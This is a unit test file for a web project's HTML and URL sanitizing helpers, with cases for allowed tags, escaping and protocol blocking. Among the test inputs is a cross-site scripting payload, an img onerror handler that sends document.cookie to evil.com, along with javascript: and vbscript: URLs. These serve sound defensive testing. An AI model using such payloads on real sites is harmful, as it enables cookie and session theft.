import { EscapingHelpers } from '../../../src/utilities/helpers/escaping-helpers';

describe('EscapingHelpers', () => {
  describe('sanatizeHtmlExceptTextFormatting', () => {
    it('should return empty string when no argument is passed', () => {
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting();
      expect(result).toEqual('');
    });

    it('should sanitize given string with allowed html tags', () => {
      const text = '<i> <b> <br> <mark> <strong> <em> <small> <del> <ins> <sub> <sup>';
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(text);
      expect(result).toEqual('<i> <b> <br> <mark> <strong> <em> <small> <del> <ins> <sub> <sup>');
    });

    it('should sanitize given string with not allowed html tags', () => {
      const text = '<a> <img> <div> <span> <button> <table> <script>';
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(text);
      expect(result).toEqual(
        '&lt;a&gt; &lt;img&gt; &lt;div&gt; &lt;span&gt; &lt;button&gt; &lt;table&gt; &lt;script&gt;'
      );
    });

    it.each([
      {
        input: 'Are you sure <b>you want</b> to do this?',
        output: 'Are you sure <b>you want</b> to do this?'
      },
      {
        input: '<img src="https://example.com/logo.png" />',
        output: '&lt;img src=&quot;https://example.com/logo.png&quot; /&gt;'
      },
      {
        input: '<img src=x onerror="fetch(\'https://evil.com?\'+document.cookie)">',
        output: '&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?&#39;+document.cookie)&quot;&gt;'
      }
    ])('should sanitize random text with html tags', async (data) => {
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(data.input);
      expect(result).toEqual(data.output);
    });
  });

  describe('sanitizeExternalNavigationUrl', () => {
    it('keeps valid relative urls unchanged', () => {
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('/mfe.js')).toEqual('/mfe.js');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('/cats/cat1#details')).toEqual('/cats/cat1#details');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('/a2.html#p=')).toEqual('/a2.html#p=');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('/')).toEqual('/');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('/?x=1')).toEqual('/?x=1');
    });

    it('keeps valid absolute urls unchanged', () => {
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('https://github.com/luigi-project/luigi')).toEqual(
        'https://github.com/luigi-project/luigi'
      );
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('https://example.com')).toEqual('https://example.com');
    });

    it('preserves the presence or absence of a trailing slash', () => {
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('https://example.com/app/')).toEqual('https://example.com/app/');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('https://example.com/app')).toEqual('https://example.com/app');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('http://localhost/')).toEqual('http://localhost/');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('http://localhost')).toEqual('http://localhost');
    });

    it('does not insert a slash before query or fragment on a bare authority', () => {
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('http://localhost?foo=bar')).toEqual('http://localhost?foo=bar');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('http://localhost#frag')).toEqual('http://localhost#frag');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('http://localhost/?foo=bar')).toEqual('http://localhost/?foo=bar');
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('http://localhost/#frag')).toEqual('http://localhost/#frag');
    });

    it('blocks non-http(s) protocols', () => {
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('javascript:alert(1)')).toBeUndefined();
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('  javascript:alert(1)')).toBeUndefined();
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('data:text/html,x')).toBeUndefined();
      expect(EscapingHelpers.sanitizeExternalNavigationUrl('vbscript:msgbox(1)')).toBeUndefined();
    });
  });
});
